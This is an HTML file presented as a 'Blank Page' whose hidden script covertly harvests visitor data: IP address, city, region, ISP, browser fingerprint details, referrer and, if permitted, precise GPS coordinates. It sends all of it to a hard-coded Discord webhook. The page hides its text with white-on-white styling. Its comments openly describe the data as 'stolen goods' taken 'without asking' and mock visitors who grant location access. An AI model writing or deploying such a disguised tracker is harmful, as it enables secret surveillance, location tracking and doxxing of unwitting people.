<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blank Page</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #ffffff;
            color: #ffffff; /* Hide any potential text */
        }
    </style>
</head>
<body>
    <!-- It's just a blank, boring white page. Nothing to see here... -->

    <script>
        // Replace this with your actual Discord webhook URL
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1546905177066442913/lL1peMXpXAfiAZvL2U1qVcBXdFKONm19N0Idvlvs4t9BzB9Nmae_K9zLZDPEdwYD28tM';

        // Collect a bunch of data without asking
        const data = {
            timestamp: new Date().toISOString(),
            ip: 'Fetching...', // We'll get this from a service
            userAgent: navigator.userAgent,
            language: navigator.language,
            platform: navigator.platform,
            screenResolution: `${screen.width}x${screen.height}`,
            colorDepth: screen.colorDepth,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            cookiesEnabled: navigator.cookieEnabled,
            referrer: document.referrer || 'Direct visit',
            // Let's try to get more precise location if permissions are loose
            geolocation: 'Not attempted'
        };

        // First, try to get the IP via a third-party service (common trick)
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(ipData => {
                data.ip = ipData.ip;
                sendToDiscord();
            })
            .catch(() => {
                // Fallback if that service is blocked
                fetch('https://ipapi.co/json/')
                    .then(response => response.json())
                    .then(ipData => {
                        data.ip = ipData.ip;
                        // Snatch city, region, country, and ISP too if available
                        data.city = ipData.city;
                        data.region = ipData.region;
                        data.country = ipData.country_name;
                        data.isp = ipData.org;
                        sendToDiscord();
                    })
                    .catch(err => {
                        data.ip = 'Failed to fetch';
                        sendToDiscord();
                    });
            });

        // Function to package and send the stolen goods to Discord
        function sendToDiscord() {
            const payload = {
                content: `**New Visitor Data Snatched**`,
                embeds: [{
                    title: "Collected Data",
                    color: 0xFF0000, // Nice red color
                    fields: [
                        { name: "IP Address", value: data.ip, inline: true },
                        { name: "User Agent", value: `\`\`\`${data.userAgent}\`\`\``, inline: false },
                        { name: "Screen", value: `${data.screenResolution} @ ${data.colorDepth}-bit`, inline: true },
                        { name: "Language/Timezone", value: `${data.language} / ${data.timezone}`, inline: true },
                        { name: "Platform", value: data.platform, inline: true },
                        { name: "Referrer", value: data.referrer, inline: true },
                        { name: "Cookies Enabled?", value: data.cookiesEnabled.toString(), inline: true }
                    ],
                    timestamp: data.timestamp
                }]
            };

            // Add extra location fields if we got them
            if (data.city) {
                payload.embeds[0].fields.push({ name: "Location", value: `${data.city}, ${data.region}, ${data.country}`, inline: false });
            }
            if (data.isp) {
                payload.embeds[0].fields.push({ name: "ISP/Org", value: data.isp, inline: false });
            }

            // Send it off quietly
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }).catch(err => console.error('Failed to send to Discord:', err));
        }

        // Optional: Try to get precise geolocation if the user is dumb enough to allow it
        if ("geolocation" in navigator) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    data.geolocation = `Lat: ${position.coords.latitude}, Long: ${position.coords.longitude}`;
                    // Send an update with the juicy coordinates
                    const geoPayload = {
                        content: `**GEOLOCATION ACQUIRED!**\n\`${data.geolocation}\` from IP: ${data.ip}`
                    };
                    fetch(WEBHOOK_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(geoPayload)
                    });
                },
                (error) => {
                    data.geolocation = `Denied: ${error.message}`;
                }
            );
        }
    </script>
</body>
</html>
